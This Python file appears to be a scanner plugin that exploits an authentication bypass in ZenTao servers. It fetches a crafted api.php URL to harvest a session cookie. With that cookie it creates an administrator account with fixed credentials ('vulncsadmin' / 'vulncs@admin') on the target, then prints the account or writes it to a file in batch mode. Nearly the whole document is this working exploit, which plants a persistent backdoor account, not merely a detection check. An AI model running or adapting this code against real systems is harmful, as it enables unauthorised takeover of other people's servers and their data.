import urllib3,requests
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class ZenTao_Login_Bypass_Scan:
    def run(self,url):
        base_url = url + "/zentao/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=upkbbehwgfscwizoglpw&branch=zqbcsfncxlpopmrvchsu"
        base_url2 = url + "/zentao/api.php/v1/users"
        try:
            response = requests.get(base_url,headers=self.headers,verify=self.ssl,proxies=self.proxy,timeout=self.timeout)
            cookie = response.headers.get("Set-Cookie",False)
            if cookie and "zentaosid" in cookie:
                OutPrintInfoSuc("ZenTao", f"目标存在漏洞:{base_url}")
                cookie = response.headers.get("Set-Cookie")
                if ";" in response.headers.get("Set-Cookie"):
                    cookie = response.headers.get("Set-Cookie").split(";")[0]
                if not self.batch:
                    OutPrintInfo("ZenTao", f'Cookie: {cookie}')
                headers = {
                    "User-Agent": self.headers["User-Agent"],
                    "Cookie": cookie,
                    "Content-type": "application/json"
                }
                data = {"account": "vulncsadmin", "password": "vulncs@admin", "realname": "vulncsadmin", "role": "top", "group": "1"}
                requests.post(base_url2, headers=headers, verify=self.ssl, proxies=self.proxy,
                                        timeout=self.timeout,json=data)
                
                if not self.batch:
                    OutPrintInfo("ZenTao", f"User: vulncsadmin | Pass: vulncs@admin")
                else:
                    OutPutFile("ZenTao_login_bypass.txt",f"目标存在漏洞: {base_url} | User: vulncsadmin | Pass: vulncs@admin")

                return True
            else:
                if not self.batch:
                    OutPrintInfo("ZenTao", "目标不存在ZenTaoBlade Login Bypass漏洞")
                return False

        except Exception as e:
            if not self.batch:
                OutPrintInfo("ZenTao", "目标请求出错")
                return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.ssl = target["ssl"]
        headers = target["header"]
        proxy = target["proxy"]
        self.timeout = int(target["timeout"])
        self.headers, self.proxy = ReqSet(header=headers, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("ZenTao", f"开始检测ZenTaoBlade Login Bypass漏洞...")
        self.run(url)

        if not self.batch:
            OutPrintInfo("ZenTao", f"ZenTaoBlade Login Bypass漏洞检测结束")

